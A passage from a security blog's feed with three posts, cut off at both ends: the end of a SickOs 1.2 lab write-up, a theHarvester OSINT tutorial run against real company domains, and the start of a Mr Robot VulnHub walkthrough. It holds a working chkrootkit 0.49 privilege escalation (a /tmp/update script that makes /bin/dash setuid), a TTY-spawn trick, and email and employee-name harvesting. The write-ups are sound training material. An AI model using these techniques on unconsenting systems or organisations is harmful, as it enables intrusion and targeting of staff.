</span><span class='line'>/etc/cron.daily:
</span><span class='line'>total 72
</span><span class='line'>drwxr-xr-x  2 root root  4096 Apr 12  2016 .
</span><span class='line'>drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
</span><span class='line'>-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
</span><span class='line'>-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
</span><span class='line'>-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
</span><span class='line'>-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
</span><span class='line'>-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
</span><span class='line'>-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
</span><span class='line'>-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
</span><span class='line'>-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
</span><span class='line'>-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
</span><span class='line'>-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
</span><span class='line'>-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
</span><span class='line'>-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
</span><span class='line'>-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard</span></code></pre></td></tr></table></div></figure>


<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ chkrootkit -V
</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>


<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>

<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/shells
</span><span class='line'># /etc/shells: valid login shells
</span><span class='line'>/bin/sh
</span><span class='line'>/bin/dash
</span><span class='line'>/bin/bash
</span><span class='line'>/bin/rbash
</span><span class='line'>$ ls -l /bin/*sh
</span><span class='line'>-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
</span><span class='line'>-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash -&gt; bash
</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -&gt; dash
</span><span class='line'>lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh -&gt; busybox</span></code></pre></td></tr></table></div></figure>


<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>

<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat update
</span><span class='line'>#!/bin/bash
</span><span class='line'>chmod u+s /bin/dash</span></code></pre></td></tr></table></div></figure>


<p>Then I waited a minute for cron to run and got root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /bin/dash
</span><span class='line'>/bin/dash
</span><span class='line'># whoami
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
</span><span class='line'>
</span><span class='line'>Thanks for giving this try.
</span><span class='line'>
</span><span class='line'>@vulnhub: Thanks for hosting this UP!.</span></code></pre></td></tr></table></div></figure>


<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Tomorrow will be cancelled due to lack \
</span><span class='line'>\ of interest.                           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TheHarvester - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools/"/>
    <updated>2017-07-02T08:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to perform OSINT recon on a target and aggregate information from different sources. TheHarvester is an e-mail, subdomain and people names harvester written in Python.</p>

<p>Homepage: <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>

<!-- more -->


<h2>theharvester description</h2>

<blockquote><p>theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual
hosts, open ports/ banners, and employee names from different public sources
(search engines, pgp key servers).</p>

<p>Is a really simple tool, but very effective for the early stages of a penetration
test or just to know the visibility of your company in the Internet.</p>

<p>The sources are:</p>

<p>Passive:</p>

<p>-google: google search engine  &ndash; www.google.com</p>

<p>-googleCSE: google custom search engine</p>

<p>-google-profiles: google search engine, specific search for Google profiles</p>

<p>-bing: microsoft search engine  &ndash; www.bing.com</p>

<p>-bingapi: microsoft search engine, through the API (you need to add your Key in the discovery/bingsearch.py file)</p>

<p>-dogpile: Dogpile search engine &ndash; www.dogpile.com</p>

<p>-pgp: pgp key server &ndash; mit.edu</p>

<p>-linkedin: google search engine, specific search for Linkedin users</p>

<p>-vhost: Bing virtual hosts search</p>

<p>-twitter: twitter accounts related to an specific domain (uses google search)</p>

<p>-googleplus: users that works in target company (uses google search)</p>

<p>-yahoo: Yahoo search engine</p>

<p>-baidu: Baidu search engine</p>

<p>-shodan: Shodan Computer search engine, will search for ports and banner of the
discovered hosts  (<a href="http://www.shodanhq.com/">http://www.shodanhq.com/</a>)</p>

<p>Active:</p>

<p>-DNS brute force: this plugin will run a dictionary brute force enumeration</p>

<p>-DNS reverse lookup: reverse lookup of ip´s discovered in order to find hostnames</p>

<p>-DNS TDL expansion: TLD dictionary brute force enumeration</p>

<p>Modules that need API keys to work:</p>

<p>-googleCSE: You need to create a Google Custom Search engine(CSE), and add your
Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>

<p>-shodan: You need to provide your API key in discovery/shodansearch.py</p></blockquote>

<h2>theharvester options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Usage: theharvester options 
</span><span class='line'>
</span><span class='line'>       -d: Domain to search or company name
</span><span class='line'>       -b: data source: google, googleCSE, bing, bingapi, pgp, linkedin,
</span><span class='line'>                        google-profiles, jigsaw, twitter, googleplus, all
</span><span class='line'>
</span><span class='line'>       -s: Start in result number X (default: 0)
</span><span class='line'>       -v: Verify host name via dns resolution and search for virtual hosts
</span><span class='line'>       -f: Save the results into an HTML and XML file (both)
</span><span class='line'>       -n: Perform a DNS reverse query on all ranges discovered
</span><span class='line'>       -c: Perform a DNS brute force for the domain name
</span><span class='line'>       -t: Perform a DNS TLD expansion discovery
</span><span class='line'>       -e: Use this DNS server
</span><span class='line'>       -l: Limit the number of results to work with(bing goes from 50 to 50 results,
</span><span class='line'>            google 100 to 100, and pgp doesn't use this option)
</span><span class='line'>       -h: use SHODAN database to query discovered hosts
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>        theharvester -d microsoft.com -l 500 -b google -h myresults.html
</span><span class='line'>        theharvester -d microsoft.com -b pgp
</span><span class='line'>        theharvester -d microsoft -l 200 -b linkedin
</span><span class='line'>        theharvester -d apple.com -b googleCSE -l 500 -s 300</span></code></pre></td></tr></table></div></figure>


<h2>theharvester usage</h2>

<ul>
<li>search with all options for a given domain</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d hackerone.com -l 200 -b all -f harvested
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Full harvest..
</span><span class='line'>[-] Searching in Google..
</span><span class='line'>  Searching 0 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>[-] Searching in PGP Key server..
</span><span class='line'>[-] Searching in Bing..
</span><span class='line'>  Searching 50 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 150 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>[-] Searching in Exalead..
</span><span class='line'>  Searching 50 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 150 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>  Searching 250 results...
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[+] Emails found:
</span><span class='line'>------------------
</span><span class='line'>feedback@hackerone.com
</span><span class='line'>support@hackerone.com
</span><span class='line'>[REDACTED}
</span><span class='line'>
</span><span class='line'>[+] Hosts found in search engines:
</span><span class='line'>------------------------------------
</span><span class='line'>[-] Resolving hostnames IPs... 
</span><span class='line'>162.159.0.31:a.ns.hackerone.com
</span><span class='line'>104.16.13.26:support.hackerone.com
</span><span class='line'>104.16.99.52:www.hackerone.com
</span><span class='line'>[+] Virtual hosts:
</span><span class='line'>==================
</span><span class='line'>104.16.13.26  support.hackerone
</span><span class='line'>104.16.13.26  support.hackerone.com
</span><span class='line'>104.16.99.52  hackerone
</span><span class='line'>[+] Saving files...
</span><span class='line'>Files saved!</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind that I&rsquo;m editing some results from the output for privacy reasons. I&rsquo;m also saving all results in HTML</p>

<ul>
<li>Linkedin enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d cisco.com -b linkedin -l 100 -f cisco
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[-] Searching in Linkedin..
</span><span class='line'>  Searching 100 results..
</span><span class='line'>Users from Linkedin:
</span><span class='line'>====================
</span><span class='line'>Name
</span><span class='line'>Another name
</span><span class='line'>Names 
</span><span class='line'>Names everywhere</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Twitter enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d chousensha.github.io -l 10 -b twitter
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[-] Searching in Twitter ..
</span><span class='line'>  Searching 100 results..
</span><span class='line'>Users from Twitter:
</span><span class='line'>====================
</span><span class='line'>@-moz-keyframes gb__a
</span><span class='line'>@keyframes gb__a
</span><span class='line'>@-moz-keyframes gb__nb
</span><span class='line'>@keyframes gb__nb
</span><span class='line'>@media 
</span><span class='line'>@keyframes qli-container-rotate 
</span><span class='line'>@keyframes qli-fill-unfill-rotate 
</span><span class='line'>@keyframes qli-blue-fade-in-out 
</span><span class='line'>@keyframes qli-red-fade-in-out 
</span><span class='line'>@keyframes qli-yellow-fade-in-out 
</span><span class='line'>@keyframes qli-green-fade-in-out 
</span><span class='line'>@keyframes qli-left-spin 
</span><span class='line'>@keyframes qli-right-spin 
</span><span class='line'>@kalilinux load balancer detector ...
</span><span class='line'>@chous3nsha
</span><span class='line'>@</span></code></pre></td></tr></table></div></figure>


<ul>
<li>sample HTML output</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/harvester.png" title="theharvester" alt="theharvester HTML report"></p>

<p>Also note that doing a reverse query on the discovered ranges takes long and the output might be overwhelming.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ In India, "cold weather" is merely a    \
</span><span class='line'>| conventional phrase and has come into   |
</span><span class='line'>| use through the necessity of having     |
</span><span class='line'>| some way to distinguish between weather |
</span><span class='line'>| which will melt a brass door-knob and   |
</span><span class='line'>| weather which will only make it mushy.  |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owning Mr Robot]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
    <updated>2017-07-01T04:46:24-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>

<!-- more -->


<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>masscan -p1-65535 --banners 192.168.217.145 --rate=10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-07-01 08:49:44 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 1 hosts [65535 ports/host]
</span><span class='line'>Discovered open port 443/tcp on 192.168.217.145                                
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.145     
</span><span class='line'>
</span><span class='line'>nmap -T4 -p80,443 -A 192.168.217.145
</span><span class='line'>PORT    STATE SERVICE  VERSION
</span><span class='line'>80/tcp  open  http     Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>443/tcp open  ssl/http Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>| ssl-cert: Subject: commonName=www.example.com
</span><span class='line'>| Not valid before: 2015-09-16T10:45:03
</span><span class='line'>|_Not valid after:  2025-09-13T10:45:03</span></code></pre></td></tr></table></div></figure>


<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/fsociety.png" title="fsociety" alt="fsociety login"></p>

<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>

<ul>
<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/deflated.png" title="sports scandal" alt="sports scandal"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/space.png" title="space rocket" alt="space rocket"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/meast.png" title="middle east" alt="middle east"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/gala.png" title="gala" alt="celebrity gala"></p>

<ul>
<li>question &ndash; more pictures with hard to accept truths</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/america.png" title="patriot" alt="american dream"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/executive.png" title="executive" alt="executive stealing"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/capitalist.png" title="capitalism" alt="capitalism"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/bzns.png" title="business" alt="business"></p>

<ul>
<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/mail.png" title="enter your mail" alt="enter your mail"></p>

<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/whois.png" title="whois mr robot" alt="whois mr robot"></p>

<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>

<ul>
<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
<li><p>elliot &ndash; shows a GIF</p></li>
<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
<li><p>restart &ndash; another scene from the series</p></li>
<li><p>join &ndash; get in touch with Mr Robot</p></li>
<li><p>archive &ndash; shows some of the above commands</p></li>
</ul>


<h2>Flag #1</h2>

<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>fsocity.dic
</span><span class='line'>key-1-of-3.txt</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>

<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>

<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>

<h3>uniscan description</h3>

<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>

<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>

<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/uniscan-gui.png" title="uniscan-gui" alt="uniscan gui"></p>

<h3>uniscan options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>####################################
</span><span class='line'># Uniscan project                  #
</span><span class='line'># http://uniscan.sourceforge.net/  #
</span><span class='line'>####################################
</span><span class='line'>V. 6.3
</span><span class='line'>
